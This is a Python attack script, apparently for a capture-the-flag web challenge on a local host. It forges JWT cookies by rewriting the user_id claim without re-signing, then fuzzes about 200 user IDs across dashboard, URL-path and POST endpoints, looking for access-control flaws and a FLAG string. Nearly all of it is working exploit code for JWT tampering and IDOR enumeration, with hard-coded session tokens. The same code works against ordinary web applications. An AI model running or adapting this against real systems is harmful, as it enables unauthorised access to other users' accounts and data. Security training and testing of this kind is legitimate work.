import requests
import json
import base64
import re

# Target configuration
BASE_URL = "http://127.0.0.1:32933"
ENDPOINTS = ["/dashboard", "/password/test"]

# Cookies from context
COOKIES = {
    "auth_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs",
    "session": "eyJ1c2VyX2lkIjoxMDAzMn0.ac0MHQ.WXax9MpWcySwsGfO_WWtaUCYm-0"
}

# Establish baseline first
session = requests.Session()
for name, value in COOKIES.items():
    session.cookies.set(name, value)

print("=" * 80)
print("BASELINE ESTABLISHMENT")
print("=" * 80)

baselines = {}
for endpoint in ENDPOINTS:
    resp = session.get(f"{BASE_URL}{endpoint}")
    baselines[endpoint] = {
        "status": resp.status_code,
        "size": len(resp.content),
        "hash": hash(resp.text)
    }
    print(f"[BASELINE] {endpoint}: Status={resp.status_code}, Size={len(resp.content)}B")

print(f"\nBaseline established: dashboard={baselines['/dashboard']['size']}B, password/test={baselines['/password/test']['size']}B")

# Helper to decode JWT
def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        payload = base64.urlsafe_b64decode(parts[1] + '==')
        return json.loads(payload)
    except:
        return None

# Helper to modify JWT user_id (will invalidate signature)
def modify_jwt_user_id(token, new_user_id):
    try:
        parts = token.split('.')
        payload = base64.urlsafe_b64decode(parts[1] + '==')
        payload_dict = json.loads(payload)
        payload_dict['user_id'] = new_user_id
        new_payload = base64.urlsafe_b64encode(json.dumps(payload_dict, separators=(',', ':')).encode()).decode().rstrip('=')
        return f"{parts[0]}.{new_payload}.{parts[2]}"
    except:
        return None

# Function to test with modified JWT
def test_id_with_jwt(session, endpoint, user_id, test_type="numeric"):
    modified_token = modify_jwt_user_id(COOKIES['auth_token'], user_id)
    if not modified_token:
        return None
    
    test_cookies = {
        "auth_token": modified_token,
        "session": COOKIES['session']
    }
    
    resp = requests.get(f"{BASE_URL}{endpoint}", cookies=test_cookies)
    baseline = baselines[endpoint]
    
    different = resp.status_code != baseline['status'] or len(resp.content) != baseline['size']
    flag_found = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    return {
        "status": resp.status_code,
        "size": len(resp.content),
        "different": different,
        "flag_found": bool(flag_found),
        "flag": flag_found.group(0) if flag_found else None
    }

# Function to test URL parameter
def test_id_in_url(session, user_id, test_type="numeric"):
    url = f"{BASE_URL}/password/{user_id}"
    resp = session.get(url)
    baseline_size = baselines["/password/test"]["size"]
    
    different = resp.status_code != 200 or len(resp.content) != baseline_size
    flag_found = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    return {
        "status": resp.status_code,
        "size": len(resp.content),
        "different": different,
        "flag_found": bool(flag_found),
        "flag": flag_found.group(0) if flag_found else None
    }

# Function to test POST parameter
def test_id_in_post(session, user_id, test_type="numeric"):
    data = {"user_id": user_id}
    resp = session.post(f"{BASE_URL}/password/test", data=data)
    baseline_size = baselines["/password/test"]["size"]
    
    different = resp.status_code != 200 or len(resp.content) != baseline_size
    flag_found = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    return {
        "status": resp.status_code,
        "size": len(resp.content),
        "different": different,
        "flag_found": bool(flag_found),
        "flag": flag_found.group(0) if flag_found else None
    }

# TRACK RESULTS
anomalies = []
total_tests = 0

# =============================================================================
# TEST 1: Sequential Numeric Fuzzing (±100 from 10032)
# =============================================================================
print("\n" + "=" * 80)
print("TEST 1: Sequential Numeric Fuzzing (9932 to 10132)")
print("=" * 80)

sequential_results = {"jwt_dashboard": 0, "jwt_password": 0, "url": 0, "post": 0}

for user_id in range(9932, 10133):
    total_tests += 1
    
    # Test with modified JWT on dashboard
    result = test_id_with_jwt(session, "/dashboard", user_id)
    if result and result['different']:
        sequential_results["jwt_dashboard"] += 1
        print(f"[ANOMALY] JWT Dashboard ID={user_id}: Status={result['status']}, Size={result['size']}B")
        if result['flag_found']:
            print(f"[!] FLAG FOUND: {result['flag']}")
            anomalies.append({"type": "JWT Dashboard", "id": user_id, "flag": result['flag']})
    
    # Test with modified JWT on password/test
    result = test_id_with_jwt(session, "/password/test", user_id)
    if result and result['different']:
        sequential_results["jwt_password"] += 1
        print(f"[ANOMALY] JWT Password ID={user_id}: Status={result['status']}, Size={result['size']}B")
        if result['flag_found']:
            print(f"[!] FLAG FOUND: {result['flag']}")
            anomalies.append({"type": "JWT Password", "id": user_id, "flag": result['flag']})
    
    # Test as URL parameter
    result = test_id_in_url(session, user_id)
    if result['different']:
        sequential_results["url"] += 1
        print(f"[ANOMALY] URL ID={user_id}: Status={result['status']}, Size={result['size']}B")
        if result['flag_found']:
            print(f"[!] FLAG FOUND: {result['flag']}")
            anomalies.append({"type": "URL", "id": user_id, "flag": result['flag']})
    
    # Test as POST parameter
    result = test_id_in_post(session, user_id)
    if result['different']:
        sequential_results["post"] += 1
        print(f"[ANOMALY] POST ID={user_id}: Status={result['status']}, Size={result['size']}B")
        if result['flag_found']:
            print(f"[!] FLAG FOUND: {result['flag']}")
            anomalies.append({"type": "POST", "id": user_id, "flag": result['flag']})
    
    if user_id % 100 == 0:
        print(f"[PROGRESS] Tested IDs up to {user_id}")

print(f"\n[SUMMARY] Sequential Numeric: JWT Dashboard anomalies={sequential_results['jwt_dashboard']}, JWT Password anomalies={sequential_results['jwt_password']}, URL anomalies={sequential_results['url']}, POST anomalies={sequential_results['post']}")

# =============================================================================
